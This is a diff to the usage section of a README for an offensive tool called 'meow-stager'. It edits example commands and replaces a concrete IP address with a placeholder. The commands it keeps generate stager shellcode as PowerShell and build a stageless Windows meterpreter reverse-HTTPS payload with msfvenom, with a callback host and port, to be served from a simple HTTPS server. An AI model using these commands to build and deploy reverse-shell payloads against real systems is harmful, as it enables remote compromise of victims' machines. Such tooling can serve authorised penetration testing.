@@ -19,11 +19,11 @@ Usage:  -a <arch> -i <ip> -p <port> -u <uri> -f <format>
 Example:
 ```
 # Generate stager shellcode
-sudo docker run -i --rm meow-stager -a x64 -i 192.168.45.166 -p 443 -u file/meow -f ps1
+sudo docker run -i --rm meow-stager -a x64 -i 192.168.xx.xx -p 443 -u file/meow -f ps1
 
 
 # Generate stageless shellcode and host on simple-https-server
-msfvenom -p windows/x64/meterpreter_reverse_https LHOST=4192.168.45.166 LPORT=10001 LURI=msf -f raw 
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.xx.xx LPORT=10001 LURI=msf -f raw 
 sudo python3 simple-https-server.py 443
 ```
 
